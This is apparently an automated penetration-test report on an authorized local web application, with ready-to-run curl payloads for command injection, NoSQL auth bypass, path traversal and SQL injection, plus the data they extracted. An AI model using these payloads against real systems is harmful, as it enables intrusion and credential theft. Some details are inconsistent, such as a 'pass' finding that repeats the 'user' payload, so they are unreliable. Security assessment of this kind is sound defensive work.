# Security assessment report: 127.0.0.1

- **Target:** http://127.0.0.1:8081/
- **Authorization:** Authorized: host 127.0.0.1 in declared scope.
- **Started:** 2026-10-12T12:41:28.286232+00:00
- **Finished:** 2026-10-12T12:41:34.490519+00:00
- **Mode:** aggressive (active exploitation)
- **Exploit phase:** enabled (safe, non-destructive impact proofs)
- **URLs crawled:** 17
- **Injectable targets:** 20

## Executive summary

The scan identified **65 finding(s)** (11 critical, 14 high, 16 medium, 4 low, 20 informational).
 Of these, **56 were verified** with hard evidence and **14 were actively exploited** with safe, non-destructive payloads to demonstrate concrete impact (extracted data, command output, or file contents captured in this report).
 False-positive control experiments (negative controls, repeat consistency, baseline cleanliness) were executed on non-exploited findings: **45 passed clean**, 1 were flagged for manual review.
 Dominant risk areas: Security Misconfiguration, Information Disclosure / Source Exposure, Reconnaissance / Attack-Surface Mapping.

**Read this first:** findings marked ✅ EXPLOITED include the exact payload, a ready-to-run `curl` reproduction, the verbatim HTTP exchange, and the data the exploit extracted. Triage can confirm each one in minutes without re-deriving the attack.

## Summary

| Severity | Count | Exploited |
|---|---|---|
| CRITICAL | 11 | 9 |
| HIGH | 14 | 4 |
| MEDIUM | 16 | 1 |
| LOW | 4 | 0 |
| INFO | 20 | 0 |
| **Total** | **65** | **14** |

## Reconnaissance (attack-surface overview)

### Technology stack

| Category | Products |
|---|---|
| Framework | Express |
| Language | Node.js |
| OS | Ubuntu |
| Web server | nginx |

### WAF / CDN

No WAF / CDN detected via headers.

### HTTP methods advertised

`GET, POST, OPTIONS, PUT, DELETE, TRACE`

### Endpoints extracted from JavaScript (3)

- `/api/internal/health`
- `/api/v1/orders`
- `/api/v1/users`

### Email addresses harvested (1)

- `admin@example.com`

### Management / admin paths discovered (4)

- `/admin (200)`
- `/graphql (200)`
- `/redoc (200)`
- `/status (200)`

### API documentation endpoints (3)

- `/openapi.json (OpenAPI JSON)`
- `/redoc (ReDoc)`
- `/graphql (GraphQL endpoint)`

### Exposed source maps (1)

- `http://127.0.0.1:8081/static/app.js.map`

### Well-known endpoints (3)

- `/robots.txt (200)`
- `/sitemap.xml (200)`
- `/.well-known/security.txt (200)`

### robots.txt

```
User-agent: *
Disallow: /admin
Disallow: /private
Sitemap: /sitemap.xml

```

### security.txt

```
Contact: mailto:security@example.com
Expires: 2026-12-31T23:59:59Z

```

### URLs from sitemap.xml (4)

- `http://127.0.0.1:8081/`
- `http://127.0.0.1:8081/admin`
- `http://127.0.0.1:8081/item`
- `http://127.0.0.1:8081/search`

### Discovered URLs (well-known + sitemap, 5)

- `http://127.0.0.1:8081/`
- `http://127.0.0.1:8081/admin`
- `http://127.0.0.1:8081/item`
- `http://127.0.0.1:8081/search`
- `http://127.0.0.1:8081/sitemap.xml`

## Attack plan

Produced by the attack-planner after the recon phase: what the observed attack surface implies for the hunting squads that ran next.

**Focus areas**

| Area | Why it matters |
|---|---|
| admin panel exposed | 4 management path(s) respond: /admin (200), /graphql (200), /redoc (200), /status (200) |
| API documentation exposed | 3 API doc endpoint(s) found: /openapi.json (OpenAPI JSON), /redoc (ReDoc), /graphql (GraphQL endpoint) |
| source maps | 1 .map bundle(s) ship un-minified source (possible secrets) |

**Surface statistics:** subdomains: 0, admin paths: 4, api docs: 3, js endpoints: 3, backup files: 0, sourcemaps: 1.

**Tech-specific notes**

- [Express] Express detected: verbose stack traces (X-Powered-By visible) often accompany /error dumps; enumerate routes via JS endpoints.

- Aggressive mode: the exploit phase and attack chains will attempt impact proofs on every verified finding.

## Attack chains

The exploit-chainer combined individually-proven findings into attack chains whose combined impact exceeds the sum of the parts. Each chain re-uses only the safe, read-only primitives already exercised by the exploit phase, and carries full provenance (`chain_of` fingerprints) back to its ingredients.

| Chain | Result | Severity | Evidence |
|---|---|---|---|
| `traversal-to-takeover` | Chained attack: path traversal -> credential disclosure -> account takeover | CRITICAL | proven end-to-end |
| `xss-to-session-theft` | Chained: reflected XSS + session cookie without HttpOnly -> session hijacking | HIGH | assembled from verified links |
| `source-exposure-to-secrets` | Chained: source/backup exposure discloses application secrets | HIGH | assembled from verified links |
| `redirect-to-oauth` | Chained: open redirect adjacent to OAuth flow -> authorization-code interception | MEDIUM | assembled from verified links |

## Coverage

Modules run: admin-panels, advisory, api-discovery, backup-files, command-injection, cookies, cors, default-logins, dns-recon, email-harvest, graphql-hunter, header-injection, host-header-poison, http-methods, info-disclosure, js-endpoints, jwt-attacks, nosqli, open-redirect, path-traversal, prototype-pollution, robots-sitemap, secrets, security-headers, sourcemap-exposure, sqli, ssrf, subdomain-enum, tech-fingerprint, tls, waf-detection, wayback-urls, whois-recon, xss, xxe-prober

Vulnerability classes with findings: Brute-Force / Credential Stuffing, Clickjacking, Cross-Site Request Forgery (CSRF), Cross-Site Scripting (XSS), Cryptographic Issue (secrets / JWT / weak hashing), IDOR, Information Disclosure / Source Exposure, NoSQL Injection, OAuth / SAML Misconfiguration, OS Command Injection, Open Redirect, Path Traversal / LFI / RFI, Privilege Escalation, Reconnaissance / Attack-Surface Mapping, SQL Injection, Security Misconfiguration, Server-Side Request Forgery (SSRF), Session Fixation / Hijacking, TLS / Transport Security, XML External Entity (XXE)

## Findings

### 1. [CRITICAL] OS command injection in 'host'

- **Class:** OS Command Injection
- **URL:** http://127.0.0.1:8081/ping
- **Injection point:** `GET /ping -> request parameter 'host'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-78
- **Module:** command-injection

**Description.** Injected shell command output appeared in the response via 'host'.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: the parameter is passed to a shell, so
# appended commands ('; id) executed with the web server's privileges.
output = os.popen("ping -c 1 " + request_input).read()   # injectable
# (equivalently: shell_exec("ping -c 1 " . $_GET['host']) in PHP)
```

**Impact.** Arbitrary command execution is demonstrated. An attacker runs code as the web server user (shown by the captured `id` output): full read/write on the host, theft of application secrets and credentials, lateral movement into the internal network, and persistence (cron/systemd/webshell). This is a full server-compromise scenario.

**Detection evidence.**

```
Payload ';echo $((92173*61813))' produced marker/command output.

GET http://127.0.0.1:8081/ping (host=...;echo $((92173*61813)))

--- response excerpt ---
5697489649

```

#### Proof of exploitation

The scanner executed arbitrary operating-system commands on the target and captured their output (uid=1001(z) gid=1001(z) groups=1001(z)), proving remote code execution -- not just an injection hypothesis.

**Data extracted from the target by the exploit:**

```
Executed as user: uid=1001(z) gid=1001(z) groups=1001(z)
Kernel / OS: Linux 5.10.134-013.15.kangaroo.al8.x86_64
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'host=127.0.0.1;id' 'http://127.0.0.1:8081/ping'
```

**Raw HTTP exchange:**

```http
GET /ping?host=127.0.0.1%3Bid HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 39
content-type: text/plain; charset=utf-8

uid=1001(z) gid=1001(z) groups=1001(z)

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ping in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 127.0.0.1;id
4. Observe that the output of the `id` command (the web server's OS user) appears in the response.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Never pass user input to a shell; use exec APIs with argument arrays and allowlists.

#### Bounty submission draft

**Title:** OS command injection in 'host'

**Severity:** critical (CWE-78)

**Asset:** http://127.0.0.1:8081/ping

**Summary:** Injected shell command output appeared in the response via 'host'.

**Impact:** Arbitrary command execution is demonstrated. An attacker runs code as the web server user (shown by the captured `id` output): full read/write on the host, theft of application secrets and credentials, lateral movement into the internal network, and persistence (cron/systemd/webshell). This is a full server-compromise scenario.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 2. [CRITICAL] JWT alg=none confusion accepted [cookie:jwt_session]

- **Class:** Cryptographic Issue (secrets / JWT / weak hashing)
- **URL:** http://127.0.0.1:8081/jwt
- **Injection point:** `GET /jwt`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-347
- **Module:** jwt-attacks

**Description.** The server accepts an unsigned (alg=none) variant of its own token.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
baseline accepted on http://127.0.0.1:8081/jwt (HTTP 200, 91 bytes returned); alg=none forgery accepted (HTTP 200, 91 bytes returned); wrong-secret control correctly rejected (redirected to login)
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/jwt'
```

**Raw HTTP exchange:**

```http
GET /jwt HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/jwt in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Reject alg=none; pin allowed algorithms and keys.

#### Bounty submission draft

**Title:** JWT alg=none confusion accepted [cookie:jwt_session]

**Severity:** critical (CWE-347)

**Asset:** http://127.0.0.1:8081/jwt

**Summary:** The server accepts an unsigned (alg=none) variant of its own token.

**Impact:** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 3. [CRITICAL] NoSQL operator injection -> authentication bypass via 'user'

- **Class:** NoSQL Injection
- **URL:** http://127.0.0.1:8081/login-nosql
- **Injection point:** `POST /login-nosql -> request parameter 'user'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-943
- **Module:** nosqli

**Description.** Injecting the [$ne] operator into 'user' rewrote the query logic (user != anything) and returned an authenticated page without valid credentials.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: request fields become Mongo selectors
# without type validation, so {$ne: ...} operators match any account.
user = db.collection.find({ user: req.body.user, pass: req.body.pass })
# attacker sends user[$ne]=x -> selector becomes {user: {$ne: 'x'}}
```

**Impact.** NoSQL operator injection allows attackers to rewrite query logic: authentication bypass ($ne/$gt), boolean data extraction, and in some stacks denial of service via $where JavaScript execution.

**Detection evidence.**

```
Sent user[$ne]=bughound; response gained authentication markers absent from the baseline: dashboard, welcome back, logout

POST http://127.0.0.1:8081/login-nosql (user[$ne]=bughound)

--- response excerpt ---
<html><body>Welcome back, admin! <a href='/logout'>Logout</a> <a href='/dashboard'>Dashboard</a></body></html>
```

#### Proof of exploitation

The scanner logged in without valid credentials: injecting the NoSQL operator [$ne] into 'user' rewrote the query to 'user != anything' and the application returned an authenticated page (welcome back, dashboard, logout).

**Data extracted from the target by the exploit:**

```
Payload: user[$ne]=bughound (operator injection rewrites query logic)
Authentication-success markers in response: welcome back, dashboard, logout
Baseline (legitimate) response contained none of these markers.
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -X POST --data 'user=test&pass=test&user%5B%24ne%5D=bughound' 'http://127.0.0.1:8081/login-nosql'
```

**Raw HTTP exchange:**

```http
POST /login-nosql HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

user=test&pass=test&user%5B%24ne%5D=bughound

HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 110
content-type: text/html; charset=utf-8

<html><body>Welcome back, admin! <a href='/logout'>Logout</a> <a href='/dashboard'>Dashboard</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/login-nosql in a browser or HTTP client.
2. Send the request again with the body parameter set to the exploit payload.
3. Payload: [$ne]=bughound
4. Observe that an authenticated page is returned without any valid password.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Cast/validate input types server-side; reject object operators from query/body params; never mix user input into query selectors.

#### Bounty submission draft

**Title:** NoSQL operator injection -> authentication bypass via 'user'

**Severity:** critical (CWE-943)

**Asset:** http://127.0.0.1:8081/login-nosql

**Summary:** Injecting the [$ne] operator into 'user' rewrote the query logic (user != anything) and returned an authenticated page without valid credentials.

**Impact:** NoSQL operator injection allows attackers to rewrite query logic: authentication bypass ($ne/$gt), boolean data extraction, and in some stacks denial of service via $where JavaScript execution.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 4. [CRITICAL] NoSQL operator injection -> authentication bypass via 'pass'

- **Class:** NoSQL Injection
- **URL:** http://127.0.0.1:8081/login-nosql
- **Injection point:** `POST /login-nosql -> request parameter 'pass'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-943
- **Module:** nosqli

**Description.** Injecting the [$ne] operator into 'pass' rewrote the query logic (user != anything) and returned an authenticated page without valid credentials.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: request fields become Mongo selectors
# without type validation, so {$ne: ...} operators match any account.
user = db.collection.find({ user: req.body.user, pass: req.body.pass })
# attacker sends user[$ne]=x -> selector becomes {user: {$ne: 'x'}}
```

**Impact.** NoSQL operator injection allows attackers to rewrite query logic: authentication bypass ($ne/$gt), boolean data extraction, and in some stacks denial of service via $where JavaScript execution.

**Detection evidence.**

```
Sent pass[$ne]=bughound; response gained authentication markers absent from the baseline: dashboard, welcome back, logout

POST http://127.0.0.1:8081/login-nosql (pass[$ne]=bughound)

--- response excerpt ---
<html><body>Welcome back, admin! <a href='/logout'>Logout</a> <a href='/dashboard'>Dashboard</a></body></html>
```

#### Proof of exploitation

The scanner logged in without valid credentials: injecting the NoSQL operator [$ne] into 'user' rewrote the query to 'user != anything' and the application returned an authenticated page (welcome back, dashboard, logout).

**Data extracted from the target by the exploit:**

```
Payload: user[$ne]=bughound (operator injection rewrites query logic)
Authentication-success markers in response: welcome back, dashboard, logout
Baseline (legitimate) response contained none of these markers.
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -X POST --data 'user=test&pass=test&user%5B%24ne%5D=bughound' 'http://127.0.0.1:8081/login-nosql'
```

**Raw HTTP exchange:**

```http
POST /login-nosql HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

user=test&pass=test&user%5B%24ne%5D=bughound

HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 110
content-type: text/html; charset=utf-8

<html><body>Welcome back, admin! <a href='/logout'>Logout</a> <a href='/dashboard'>Dashboard</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/login-nosql in a browser or HTTP client.
2. Send the request again with the body parameter set to the exploit payload.
3. Payload: [$ne]=bughound
4. Observe that an authenticated page is returned without any valid password.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Cast/validate input types server-side; reject object operators from query/body params; never mix user input into query selectors.

#### Bounty submission draft

**Title:** NoSQL operator injection -> authentication bypass via 'pass'

**Severity:** critical (CWE-943)

**Asset:** http://127.0.0.1:8081/login-nosql

**Summary:** Injecting the [$ne] operator into 'pass' rewrote the query logic (user != anything) and returned an authenticated page without valid credentials.

**Impact:** NoSQL operator injection allows attackers to rewrite query logic: authentication bypass ($ne/$gt), boolean data extraction, and in some stacks denial of service via $where JavaScript execution.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 5. [CRITICAL] Path traversal / LFI in 'name'

- **Class:** Path Traversal / LFI / RFI
- **URL:** http://127.0.0.1:8081/file
- **Injection point:** `GET /file -> request parameter 'name'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-22
- **Module:** path-traversal

**Description.** 'name' allows reading arbitrary local files via directory traversal.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: '../' sequences in the parameter escape the
# intended base directory and the server returns arbitrary file contents.
path = base_dir + request_input          # no normalisation / containment
content = open(path).read()              # -> /etc/passwd retrievable
```

**Impact.** Arbitrary file read as the web-server user is demonstrated. An attacker can exfiltrate configuration with database credentials, application source, SSH private keys, cron jobs and logs. Combined with any file-write or log-poisoning primitive this typically escalates to remote code execution.

**Detection evidence.**

```
Payload '../../../../../../etc/passwd' returned system file contents.

GET http://127.0.0.1:8081/file (name=../../../../../../etc/passwd)

--- response excerpt ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

#### Proof of exploitation

The scanner read real operating-system files off the target host through the traversal primitive -- including a second, distinct file to prove the read is fully arbitrary, not a quirk of one hardcoded path.

**Data extracted from the target by the exploit:**

```
/etc/passwd read successfully -- 2 system accounts visible:
    root:x:0:0:root:/root:/bin/bash
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
/etc/hostname read successfully: 'contents of ..%2f..%2f..%2f..%2fetc%2fhostname' (proves arbitrary file read, not a fixed file)
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'name=../../../../../../etc/passwd' 'http://127.0.0.1:8081/file'
```

**Raw HTTP exchange:**

```http
GET /file?name=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 114
content-type: text/html; charset=utf-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/file in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: ../../../../../../etc/passwd
4. Observe that the contents of /etc/passwd (system account list) are returned instead of the legitimate file.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Resolve and canonicalize paths, enforce an allowlist, never use raw input in file paths.

#### Bounty submission draft

**Title:** Path traversal / LFI in 'name'

**Severity:** critical (CWE-22)

**Asset:** http://127.0.0.1:8081/file

**Summary:** 'name' allows reading arbitrary local files via directory traversal.

**Impact:** Arbitrary file read as the web-server user is demonstrated. An attacker can exfiltrate configuration with database credentials, application source, SSH private keys, cron jobs and logs. Combined with any file-write or log-poisoning primitive this typically escalates to remote code execution.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 6. [CRITICAL] Error-based SQL injection in 'id'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/item
- **Injection point:** `GET /item -> request parameter 'id'`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Injecting a quote into 'id' produced a database error.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: injecting a quote produces a database
# parser error, proving the input is spliced raw into the SQL statement.
query = "SELECT ... WHERE col = '" + request_input + "'"   # injectable
rows = db.execute(query)   # -> SQL syntax error when input contains a quote
```

**Detection evidence.**

```
DB error signature: 'SQL syntax; check the manual that corresponds to your MySQL'

GET http://127.0.0.1:8081/item (id=<value>'")

--- response excerpt ---
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
```

#### Exploit phase result

Tautology payloads did not reveal additional data on this injection point (no measurable hidden-content growth); detection evidence stands.

#### False-positive analysis

All 3 false-positive checks passed (baseline-clean, negative-control, repeat-consistency): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the error-based SQL injection behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| baseline-clean | PASS | unmodified request shows no DB error |
| negative-control | PASS | benign suffix 'benignuqkldxkm33' (no quote) produced no DB error |
| repeat-consistency | PASS | payload reproduced the DB error in 2/2 repeat request(s) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Use parameterized queries / prepared statements; never build SQL from input.

#### Bounty submission draft

**Title:** Error-based SQL injection in 'id'

**Severity:** critical (CWE-89)

**Asset:** http://127.0.0.1:8081/item

**Summary:** Injecting a quote into 'id' produced a database error.

**Impact:** 

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 7. [CRITICAL] Error-based SQL injection in 'id'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/product
- **Injection point:** `GET /product -> request parameter 'id'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Injecting a quote into 'id' produced a database error.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: injecting a quote produces a database
# parser error, proving the input is spliced raw into the SQL statement.
query = "SELECT ... WHERE col = '" + request_input + "'"   # injectable
rows = db.execute(query)   # -> SQL syntax error when input contains a quote
```

**Impact.** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Detection evidence.**

```
DB error signature: 'sqlite3.OperationalError'

GET http://127.0.0.1:8081/product (id=<value>'")

--- response excerpt ---
sqlite3.OperationalError: query failed
```

#### Proof of exploitation

The scanner read the backend SQLite database directly via UNION-based SQL injection and then logged into the application as 'administrator' with the extracted credentials. The scanner then authenticated as 'administrator' through the application's own login endpoint, proving full account takeover.

**Data extracted from the target by the exploit:**

```
UNION injection works with 3 column(s)
Database: SQLite
Version banner: 3.53.1
Tables enumerated: products, users, sessions
Credential rows extracted from table 'users' (columns username/password):
  administrator : S3cret-wizard-pass
Credential recovered: 'administrator' / 'S3cret-wizard-pass'
ACCOUNT TAKEOVER: logged in via http://127.0.0.1:8081/login as 'administrator' -- authenticated markers in response: log out, logout, my account
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'id=1 UNION SELECT NULL,NULL,NULL-- -' 'http://127.0.0.1:8081/product'
```

**Raw HTTP exchange:**

```http
GET /product?id=1%20UNION%20SELECT%20%28SELECT%20%27bhv%3D%27%7C%7Csqlite_version%28%29%7C%7C%27~bhEND~%27%29%2CNULL%2CNULL--%20- HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 121
content-type: text/html; charset=utf-8

<html><body>Welcome back, administrator! <a href='/my-account'>My account</a> <a href='/logout'>Log out</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/product in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 1 UNION SELECT NULL,NULL,NULL-- -
4. Observe that the extracted database data appears in the response.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Use parameterized queries / prepared statements; never build SQL from input.

#### Bounty submission draft

**Title:** Error-based SQL injection in 'id'

**Severity:** critical (CWE-89)

**Asset:** http://127.0.0.1:8081/product

**Summary:** Injecting a quote into 'id' produced a database error.

**Impact:** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 8. [CRITICAL] Error-based SQL injection in 'category'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/filter
- **Injection point:** `GET /filter -> request parameter 'category'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Injecting a quote into 'category' produced a database error.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: injecting a quote produces a database
# parser error, proving the input is spliced raw into the SQL statement.
query = "SELECT ... WHERE col = '" + request_input + "'"   # injectable
rows = db.execute(query)   # -> SQL syntax error when input contains a quote
```

**Impact.** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Detection evidence.**

```
DB error signature: 'sqlite3.OperationalError'

GET http://127.0.0.1:8081/filter (category=<value>'")

--- response excerpt ---
sqlite3.OperationalError: query failed
```

#### Proof of exploitation

The scanner made the backend query return data the application tries to hide by injecting the tautology '' OR 1=1-- -' into 'category' -- the response grew by ~96 bytes of previously-hidden content.

**Data extracted from the target by the exploit:**

```
Payload: Accessories' OR 1=1-- -
Baseline response: 104 bytes; tautology response: 200 bytes (beyond payload reflection)
The injected OR 1=1 condition matched every row in the queried table, revealing records that filtering was supposed to withhold.
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'category=Accessories'\'' OR 1=1-- -' 'http://127.0.0.1:8081/filter'
```

**Raw HTTP exchange:**

```http
GET /filter?category=Accessories%27%20OR%201%3D1--%20- HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 200
content-type: text/html; charset=utf-8

<html><body><div class=product>Widget - 9.99</div><div class=product>Gadget - 19.99</div><div class=product>Doohickey - 4.5</div><div class=product>Prototype Stealth Widget - 999.0</div></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/filter in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: Accessories' OR 1=1-- -
4. Observe that the hidden records appear in the response after the tautology injection.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Use parameterized queries / prepared statements; never build SQL from input.

#### Bounty submission draft

**Title:** Error-based SQL injection in 'category'

**Severity:** critical (CWE-89)

**Asset:** http://127.0.0.1:8081/filter

**Summary:** Injecting a quote into 'category' produced a database error.

